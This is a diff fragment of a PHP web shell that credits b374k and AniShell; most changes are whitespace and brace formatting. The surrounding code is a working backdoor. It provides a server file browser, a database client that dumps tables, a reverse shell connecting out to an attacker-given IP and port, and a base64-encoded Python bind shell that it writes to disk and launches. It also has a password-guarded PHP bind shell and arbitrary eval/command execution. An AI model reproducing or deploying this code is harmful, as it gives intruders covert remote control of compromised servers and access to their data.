 					$DriveTypeDB = array(0 => tText('unknow', 'Unknow'),
 						1 => tText('removable', 'Removable'),
 						2 => tText('fixed', 'Fixed'),
@@ -1132,7 +1132,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 						4 => tText('cdrom', 'CDRom'),
 						5 => tText('ramdisk', 'RAM Disk'));
 						
-					foreach ($obj->Drives as $drive) {
+					foreach ($obj->Drives as $drive){
 						$sBuff .= ' [<a href="#" data-path="' . $drive->Path . '/\'" onclick=';
 						if ($drive->DriveType == 2) 
 							$sBuff .= '"godisk(this);return false;" title="' . tText('size', 'Size') . ':' . sizecount($drive->TotalSize) . ' ' . tText('free', 'Free') . ':' . sizecount($drive->FreeSpace) . ' ' . tText('type', 'Type') . ':' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . ' ' . $drive->Path . '</a>] ';
@@ -1160,25 +1160,25 @@ if (isset($p['me']) && $p['me'] === 'file') {
 
         $dirdata = $filedata = array();
 		
-		if (@$p['view_writable'] === 'dir') {
+		if (@$p['view_writable'] === 'dir'){
 			$dirdata = GetWDirList($currentdir);
-		} elseif (@$p['view_writable'] === 'file') {
+		} elseif (@$p['view_writable'] === 'file'){
 			$filedata = GetWFileList($currentdir);
-		} elseif (@sValid($p['findstr'])) {
+		} elseif (@sValid($p['findstr'])){
 			$filedata = GetSFileList($currentdir, $p['findstr'], $p['re']);
 		} else {
-            if (is_dir($currentdir)) {
-				if ($res = opendir($currentdir)) {
+            if (is_dir($currentdir)){
+				if ($res = opendir($currentdir)){
 					$c = 0;
 					$start = False;
 					$show = True;
 					
-					if ($config['FMLimit'] && isset($p['pg'])) {
+					if ($config['FMLimit'] && isset($p['pg'])){
 						$start = ($p['pg'] > 1 ? $config['FMLimit'] * ($p['pg'] - 1) : $config['FMLimit']);
 						$config['FMLimit'] = $config['FMLimit'] * $p['pg'];
 					}
 
-					while ($file = readdir($res)) {
+					while ($file = readdir($res)){
 						if ($config['FMLimit'])	{
 							if ($start) 
 								if ($c == $start) 
@@ -1186,13 +1186,13 @@ if (isset($p['me']) && $p['me'] === 'file') {
 							if ($c == $config['FMLimit']) 
 								break;  
 						}
-						if ($show) {
-							if (is_dir($currentdir . $file)) {
-								if ($file !== '.' && $file !== '..') {
+						if ($show){
+							if (is_dir($currentdir . $file)){
+								if ($file !== '.' && $file !== '..'){
 									$c++;
 									$dirdata[] = $file;
 								}
-							} else if (is_file($currentdir . $file)) {
+							} else if (is_file($currentdir . $file)){
 								$c++;
 								$filedata[] = $file;
 							} //TODO syslinks
@@ -1220,7 +1220,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					
 			$d = 0;
 			$bg = 2;
-			foreach ($dirdata as $file) {
+			foreach ($dirdata as $file){
                 $sBuff .= '<tr data-path="' . $file . DS . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td><input type="checkbox" value="' . $file . DS . '" name="dl[]"></td>
 					<td><div class="image dir"></div><a href="#" onclick="godir(this, true);return false;">' . $file . '</a></td>
@@ -1241,7 +1241,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			//$_SERVER['DOCUMENT_ROOT']
 			//uso esa variable para saber si corresponde o no el link al archivo
 			
-            foreach ($filedata as $file) {
+            foreach ($filedata as $file){
                 $sBuff .= '<tr data-path="' . $file . '" class="' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '">
 					<td width="2%"><input type="checkbox" value="' . $file . '" name="dl[]"></td><td>';
 
@@ -1280,17 +1280,17 @@ if (isset($p['me']) && $p['me'] === 'file') {
         }
 }
 
-if (isset($p['me']) && $p['me'] === 'phpinfo') {
-    if (function_exists('phpinfo') && @!in_array('phpinfo', $dis_func)) {
+if (isset($p['me']) && $p['me'] === 'phpinfo'){
+    if (function_exists('phpinfo') && @!in_array('phpinfo', $dis_func)){
         phpinfo();
         exit;
     } else
         $sBuff = sDialog(tText('phpinfoerror', 'phpinfo() function has non-permissible'));
 }
 
-if (isset($p['me']) && $p['me'] === 'srm') {
-    if ((isset($p['uc'])) && ($p['uc'] === $p['rc'])) {
-        if (unlink(__file__)) {
+if (isset($p['me']) && $p['me'] === 'srm'){
+    if ((isset($p['uc'])) && ($p['uc'] === $p['rc'])){
+        if (unlink(__file__)){
             @ob_clean();
 			exit('Bye ;(');
         } else
@@ -1303,46 +1303,46 @@ if (isset($p['me']) && $p['me'] === 'srm') {
 			</form>';
 }
 
-if (isset($p['me']) && $p['me'] === 'sql') {
+if (isset($p['me']) && $p['me'] === 'sql'){
 	# SQL
 	//based on b374k by DSR!
 	function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
-		if ($sqltype === 'mysql') {
+		if ($sqltype === 'mysql'){
 			$hosts = explode(':', $sqlhost);
 			if(count($hosts)==2) $host_str = $hosts[0].':'.$hosts[1];
 			else $host_str = $sqlhost;
 			if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $sqluser, $sqlpass);
 			elseif(function_exists('mysql_connect')) return @mysql_connect($host_str, $sqluser, $sqlpass);
-		} elseif($sqltype === 'mssql') {
+		} elseif($sqltype === 'mssql'){
 			if(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);
 			elseif(function_exists('sqlsrv_connect')){
 				$coninfo = array('UID'=>$sqluser, 'PWD'=>$sqlpass);
 				return @sqlsrv_connect($sqlhost,$coninfo);
 			}
-		} elseif($sqltype === 'pgsql') {
+		} elseif($sqltype === 'pgsql'){
 			$hosts = explode(':', $sqlhost);
 			if(count($hosts)==2) $host_str = 'host='.$hosts[0].' port='.$hosts[1];
 			else $host_str = 'host='.$sqlhost;
 			if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$sqluser.' password='.$sqlpass);
-		} elseif($sqltype === 'oracle') { 
+		} elseif($sqltype === 'oracle'){ 
 			if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); 
-		} elseif($sqltype === 'sqlite3') {
+		} elseif($sqltype === 'sqlite3'){
 			if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
-		} elseif($sqltype === 'sqlite') { 
+		} elseif($sqltype === 'sqlite'){ 
 			if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); 
-		} elseif($sqltype === 'odbc') { 
+		} elseif($sqltype === 'odbc'){ 
 			if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass);
-		} elseif($sqltype === 'pdo') {
+		} elseif($sqltype === 'pdo'){
 			if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);
 		}
 		return false;
 	}
 
 	function sql_query($sqltype, $query, $con){
-		if ($sqltype === 'mysql') {
+		if ($sqltype === 'mysql'){
 			if(function_exists('mysqli_query')) return mysqli_query($con,$query);
 			elseif(function_exists('mysql_query')) return mysql_query($query);
-		} elseif($sqltype === 'mssql') {
+		} elseif($sqltype === 'mssql'){
 			if(function_exists('mssql_query')) return mssql_query($query);
 			elseif(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
 		} elseif($sqltype === 'pgsql') return pg_query($query);
@@ -1354,10 +1354,10 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 
 	function sql_num_fields($sqltype, $result, $con){
-		if ($sqltype === 'mysql') {
+		if ($sqltype === 'mysql'){
 			if(function_exists('mysqli_field_count')) return mysqli_field_count($con);
 			elseif (function_exists('mysql_num_fields')) return mysql_num_fields($result);
-		} elseif($sqltype === 'mssql') {
+		} elseif($sqltype === 'mssql'){
 			if(function_exists('mssql_num_fields')) return mssql_num_fields($result);
 			elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
 		} elseif($sqltype === 'pgsql') return pg_num_fields($result);
@@ -1369,12 +1369,12 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 
 	function sql_field_name($sqltype,$result,$i){
-		if ($sqltype === 'mysql') {
-			if(function_exists('mysqli_fetch_fields')) {
+		if ($sqltype === 'mysql'){
+			if(function_exists('mysqli_fetch_fields')){
 				$metadata = mysqli_fetch_fields($result);
 				if(is_array($metadata)) return $metadata[$i]->name;
 			} elseif (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
-		} elseif($sqltype === 'mssql') {
+		} elseif($sqltype === 'mssql'){
 			if(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
 			elseif(function_exists('sqlsrv_field_metadata')){
 				$metadata = sqlsrv_field_metadata($result);
@@ -1392,10 +1392,10 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 
 	function sql_fetch_data($sqltype,$result){
-		if ($sqltype === 'mysql') {
+		if ($sqltype === 'mysql'){
 			if(function_exists('mysqli_fetch_row')) return mysqli_fetch_row($result);
 			elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
-		} elseif($sqltype === 'mssql') {
+		} elseif($sqltype === 'mssql'){
 			if(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
 			elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
 		} elseif($sqltype === 'pgsql') return pg_fetch_row($result);
@@ -1407,10 +1407,10 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 
 	function sql_num_rows($sqltype,$result){
-		if ($sqltype === 'mysql') {
+		if ($sqltype === 'mysql'){
 			if(function_exists('mysqli_num_rows')) return mysqli_num_rows($result);
 			elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
-		} elseif($sqltype === 'mssql') {
+		} elseif($sqltype === 'mssql'){
 			if(function_exists('mssql_num_rows')) return mssql_num_rows($result);
 			elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
 		} elseif($sqltype === 'pgsql') return pg_num_rows($result);
@@ -1424,7 +1424,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 
 	function sql_close($sqltype,$con){
-		if ($sqltype === 'mysql') {
+		if ($sqltype === 'mysql'){
 			if(function_exists('mysqli_close')) return mysqli_close($con);
 			elseif(function_exists('mysql_close')) return mysql_close($con);
 		} elseif($sqltype === 'mssql'){
@@ -1439,7 +1439,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 	 
 	/*
-		function dump($table) {
+		function dump($table){
 			if (empty($table)) return 0;
 			$this->dump = array();
 			$this->dump[0] = '';
@@ -1449,7 +1449,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 			$this->dump[4] = '--  Table: ' . $table;
 			$this->dump[5] = '-- --------------------------------------- ';
 
-			switch ($this->db) {
+			switch ($this->db){
 				case 'MySQL':
 					$this->dump[0] = '-- MySQL dump';
 					if ($this->query('SHOW CREATE TABLE `' . $table . '`') != 1) return 0;
@@ -1458,8 +1458,8 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 					$this->dump[] = '-- ------------------------------------- ';
 					if ($this->query('SELECT * FROM `' . $table . '`') != 1) return 0;
 					if (! $this->get_result()) return 0;
-					for ($i = 0; $i < $this->num_rows; $i++) {
-						foreach ($this->rows[$i] as $k => $v) {
+					for ($i = 0; $i < $this->num_rows; $i++){
+						foreach ($this->rows[$i] as $k => $v){
 							$this->rows[$i][$k] = @mysql_real_escape_string($v);
 						}
 						$this->dump[] = 'INSERT INTO `' . $table . '` (`' . @implode("`, `", $this->columns) . '`) VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
@@ -1469,8 +1469,8 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 					$this->dump[0] = '## MSSQL dump';
 					if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
 					if (! $this->get_result()) return 0;
-					for ($i = 0; $i < $this->num_rows; $i++) {
-						foreach ($this->rows[$i] as $k => $v) {
+					for ($i = 0; $i < $this->num_rows; $i++){
+						foreach ($this->rows[$i] as $k => $v){
 							$this->rows[$i][$k] = @addslashes($v);
 						}
 						$this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
@@ -1480,8 +1480,8 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 					$this->dump[0] = '## PostgreSQL dump';
 					if ($this->query('SELECT * FROM ' . $table) != 1) return 0;
 					if (! $this->get_result()) return 0;
-					for ($i = 0; $i < $this->num_rows; $i++) {
-						foreach ($this->rows[$i] as $k => $v) {
+					for ($i = 0; $i < $this->num_rows; $i++){
+						foreach ($this->rows[$i] as $k => $v){
 							$this->rows[$i][$k] = @addslashes($v);
 						}
 						$this->dump[] = 'INSERT INTO ' . $table . ' (' . @implode(", ", $this->columns) . ') VALUES (\'' . @implode("', '", $this->rows[$i]) . '\');';
@@ -1503,21 +1503,21 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 
 	$login = 604800; //3600 * 24 * 7;
 
-	if (isset($p['sqlcode'])) {
+	if (isset($p['sqlcode'])){
 		$sBuff = '';
 		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
-		foreach(explode(';', $p['sqlcode']) as $query) {
-			if (trim($query) !== '') {
+		foreach(explode(';', $p['sqlcode']) as $query){
+			if (trim($query) !== ''){
 				$res = sql_query($p['sqltype'],$query,$con);
-				if ($res !== false) {
+				if ($res !== false){
 					$sBuff .= '<hr /><p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;<span>[ ok ]</span></p>';
 
-					if (!is_bool($res)) {
+					if (!is_bool($res)){
 						$sBuff .= '<table id="sort" class="explore sortable" style="width:100%;"><tr>';
 						for ($i = 0; $i<sql_num_fields($p['sqltype'], $res, $con); $i++)
 							$sBuff .= '<th>' . @hsc(sql_field_name($p['sqltype'], $res, $i)) . '</th>';
 						$sBuff .= '</tr>';
-						while($rows=sql_fetch_data($p['sqltype'], $res)) {
+						while($rows=sql_fetch_data($p['sqltype'], $res)){
 							$sBuff .= '<tr>';
 							foreach($rows as $r){
 								//if ($r === '') $r = ' ';
@@ -1533,7 +1533,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 		}
 		
 		sAjax($sBuff);
-	} elseif (isset($p['sqlhost'])) {
+	} elseif (isset($p['sqlhost'])){
 		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
 		if ($con !== false){
 			if(isset($p['sqlinit'])){
@@ -1553,7 +1553,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 				<table class="border" style="padding:0;"><tbody>
 				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
 				
-			if (($p['sqltype']!=='pdo') && ($p['sqltype']!=='odbc')) {
+			if (($p['sqltype']!=='pdo') && ($p['sqltype']!=='odbc')){
 				if ($p['sqltype']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
 				elseif ($p['sqltype']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
 				elseif ($p['sqltype']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
@@ -1561,7 +1561,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 				else $showdb = 'SHOW DATABASES'; //mysql
 
 				$res = sql_query($p['sqltype'], $showdb, $con);
-				if ($res !== false) {
+				if ($res !== false){
 					$bg = 0;
 					while($rowarr = sql_fetch_data($p['sqltype'], $res)){
 						foreach($rowarr as $rows){
@@ -1574,7 +1574,7 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 							else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql
 
 							$res_t = sql_query($p['sqltype'], $showtbl, $con);
-							if ($res_t!=false) {
+							if ($res_t!=false){
 								while($tablearr=sql_fetch_data($p['sqltype'], $res_t)){
 									foreach($tablearr as $tables){
 										if($p['sqltype']==='mssql') $dumptbl = 'SELECT TOP 100 * FROM '.$rows.'..'.$tables;
@@ -1601,14 +1601,14 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 		} else
 			$sBuff .= sDialog('Unable to connect to database');
 	} else {
-		if (isset($_COOKIE['c'])) {
+		if (isset($_COOKIE['c'])){
 			$delme = '';
 			if (isset($p['dc'])){
 				setcookie('c[' . $p['dc'] . ']', '', time() - $login);
 				$delme = $p['dc'];
 			}
 	
-			foreach($_COOKIE['c'] as $c => $d) {
+			foreach($_COOKIE['c'] as $c => $d){
 				if ($c == $delme) continue;
 				$sql = array();
 				foreach(((function_exists('json_encode') && function_exists('json_decode')) ? json_decode($d) : unserialize($d)) as $k => $v) $sql[$k] = $v;
@@ -1642,16 +1642,16 @@ if (isset($p['me']) && $p['me'] === 'sql') {
 	}
 }
 
-if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
-    if (@sValid($p['ip']) && sValid($p['port'])) {
+if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
+    if (@sValid($p['ip']) && sValid($p['port'])){
         $sBuff .= '<p>The Program is now trying to connect!</p>';
         $ip = $p['ip'];
         $port = $p['port'];
         $sockfd = fsockopen($ip, $port, $errno, $errstr);
-        if ($errno != 0) {
+        if ($errno != 0){
             $sBuff .= '<font color="red"><b>' . $errno . '</b>: ' . $errstr . '</font>';
         } else
-            if (! $sockfd) {
+            if (! $sockfd){
                 $result = '<p>Fatal: An unexpected error was occured when trying to connect!</p>';
             } else {
                 $len = 1500;
@@ -1666,7 +1666,7 @@ if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
 
 "); //dateandTime
 
-                while (! feof($sockfd)) {
+                while (! feof($sockfd)){
                     fputs($sockfd, '(Shell)[$]> ');
                     $command = fgets($sockfd, $len);
                     fputs($sockfd, "
@@ -1677,20 +1677,20 @@ if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
                 fclose($sockfd);
             }
     } else
-        if (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))) {
+        if (@(sValid($p['port'])) && (sValid($p['passwd'])) && (sValid($p['mode']))){
             $address = '127.0.0.1';
             $port = $p['port'];
             $pass = $p['passwd'];
 
-            if ($p['mode'] === 'Python') {
+            if ($p['mode'] === 'Python'){
                 $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";
 
                 $bindname = 'bind.py'; //TODO EL NOMBRE TENDRIA QUE SER ALEATORIO
                 $fd = fopen($bindname, 'w');
-                if ($fd) {
+                if ($fd){
                     fwrite($fd, base64_decode($Python_CODE));
 
-                    if ($isWIN) {
+                    if ($isWIN){
                         $sBuff .= '[+] OS Detected = Windows';
                         execute('start bind.py');
 
@@ -1706,7 +1706,7 @@ if (isset($p['me']) && $p['me'] === 'connect') { //Basada en AniShell
                     }
 
 
-                    if (preg_match("/$pattern/", $list)) {
+                    if (preg_match("/$pattern/", $list)){
                         $sBuff .= '<p class="alert_green">Process Found Running! Backdoor Setuped Successfully</p>';
                     } else {
                         $sBuff .= '<p class="alert_red">Process Not Found Running! Backdoor Setup FAILED</p>';
@@ -1719,14 +1719,14 @@ $list</pre>";
                 }
             }
         } else
-            if (@$p['mode'] === 'PHP') {
+            if (@$p['mode'] === 'PHP'){
                 // Set the ip and port we will listen on
-                if (function_exists("socket_create")) {
+                if (function_exists("socket_create")){
                     // Create a TCP Stream socket
                     $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
 
                     // Bind the socket to an address/port
-                    if (socket_bind($sockfd, $address, $port) == false) {
+                    if (socket_bind($sockfd, $address, $port) == false){
                         $sBuff .= "Cant Bind to the specified port and address!";
                     }
 
@@ -1739,7 +1739,7 @@ $list</pre>";
                     // Read the pass from the client
                     $input = socket_read($client, strlen($pass) + 2); // +2 for 
 
-                    if (trim($input) == $pass) {
+                    if (trim($input) == $pass){
                         socket_write($client, "
 
 ");
@@ -1749,12 +1749,12 @@ $list</pre>";
                         socket_write($client, "
 
 ");
-                        while (1) {
+                        while (1){
                             // Print command prompt
                             $maxCmdLen = 31337;
                             socket_write($client, '(Shell)[$]> ');
                             $cmd = socket_read($client, $maxCmdLen);
-                            if ($cmd == false) {
+                            if ($cmd == false){
                                 $sBuff .= 'The client Closed the conection!';
                                 break;
                             }
@@ -1841,19 +1841,20 @@ $list</pre>";
             }
 }
 
-if (isset($p['me']) && $p['me'] === 'execute') {
+if (isset($p['me']) && $p['me'] === 'execute'){
     $sBuff .= '<h2>' . tText('ev0', 'Eval/Execute') . '</h2>';
     $code = @trim($p['c']);
-    if ($code) {
-		if (isset($p['e'])) {
+    if ($code){
+		if (isset($p['e'])){
 			/*$locale = 'en_GB.utf-8';
 			setlocale(LC_ALL, $locale);
 			putenv('LC_ALL='.$locale);*/
-			$buf = hsc(execute($code));
+			$buf = execute($code, true);
+			$sBuff .= "<br><b>" . tText('ev4', 'Execute via') . ": </b>{$buf[1]}";
 			if (isset($p['dta'])) 
-				$sBuff .= '<br><textarea class="bigarea" readonly>' . $buf . '</textarea>';
+				$sBuff .= "<br><textarea class='bigarea' readonly>{$buf[0]}</textarea><br>";
 			else 
-				$sBuff .= $buf . '<br><pre></pre>';
+				$sBuff .= "<br><pre>{$buf[0]}</pre><br>";
 		} else {
 			if (!preg_match('#<\?#si', $code)) 
 				$code = "<?php\n\n{$code}\n\n?>";
@@ -1862,7 +1863,7 @@ if (isset($p['me']) && $p['me'] === 'execute') {
 			echo 'Result of the executed code:';
 			$buf = ob_get_sBuffs();
 
-			if ($buf) {
+			if ($buf){
 				ob_clean();
 				eval("?" . ">$code");
 				$ret = ob_get_sBuffs();
@@ -1889,7 +1890,7 @@ if (isset($p['me']) && $p['me'] === 'execute') {
 	</form>';
 }
 
-if (isset($p['me']) && $p['me'] === 'info') {
+if (isset($p['me']) && $p['me'] === 'info'){
     $upsize = getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
     $adminmail = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
     $dis_func = get_cfg_var('disable_functions');
@@ -1905,7 +1906,6 @@ if (isset($p['me']) && $p['me'] === 'info') {
         7 => array('Server Web Port', $_SERVER['SERVER_PORT']),
         8 => array('PHP run mode', php_sapi_name()),
         9 => array('This file path', __file__),
-
         10 => array('PHP Version', PHP_VERSION),
         11 => array('PHP Info', ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<a href="#" onclick="ajaxLoad(\'me=phpinfo\')">Yes</a>' : 'No')),
         12 => array('Safe Mode', getcfg('safe_mode')),
@@ -1920,12 +1920,10 @@ if (isset($p['me']) && $p['me'] === 'info') {
         21 => array('upload_max_filesize', $upsize),
         22 => array('max_execution_time', getcfg('max_execution_time') . ' second(s)'),
         23 => array('disable_functions', $dis_func),
-
         24 => array('MySQL', getfun('mysql_connect')),
         25 => array('MSSQL', getfun('mssql_connect')),
         26 => array('PostgreSQL', getfun('pg_connect')),
         27 => array('Oracle', getfun('ocilogon')),
-
         28 => array('Curl', getfun('curl_version')),
         29 => array('gzcompress', getfun('gzcompress')),
         30 => array('gzencode', getfun('gzencode')),
@@ -1941,18 +1939,18 @@ if (isset($p['me']) && $p['me'] === 'info') {
         </form>';
 
     $hp = array(0 => 'Server', 1 => 'PHP', 2 => 'Extras');
-    for ($a = 0; $a < 3; $a++) {
+    for ($a = 0; $a < 3; $a++){
         $sBuff .= '<h2>' . $hp[$a] . '</h2><ul>';
-        if ($a == 0) {
-            for ($i = 1; $i <= 9; $i++) {
+        if ($a == 0){
+            for ($i = 1; $i <= 9; $i++){
                 $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
             }
-        } elseif ($a == 1) {
-            for ($i = 10; $i <= 23; $i++) {
+        } elseif ($a == 1){
+            for ($i = 10; $i <= 23; $i++){
                 $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
             }
-        } elseif ($a == 2) {
-            for ($i = 24; $i <= 31; $i++) {
+        } elseif ($a == 2){
+            for ($i = 24; $i <= 31; $i++){
                 $sBuff .= '<li><b>' . $info[$i][0] . ':</b> ' . $info[$i][1] . '</li>';
             }
         }
@@ -1961,9 +1959,9 @@ if (isset($p['me']) && $p['me'] === 'info') {
     }
 }
 
-if (isset($p['me']) && $p['me'] === 'process') {
-	if (isset($p['ps'])) {
-        for ($i = 0; count($p['ps']) > $i; $i++) {
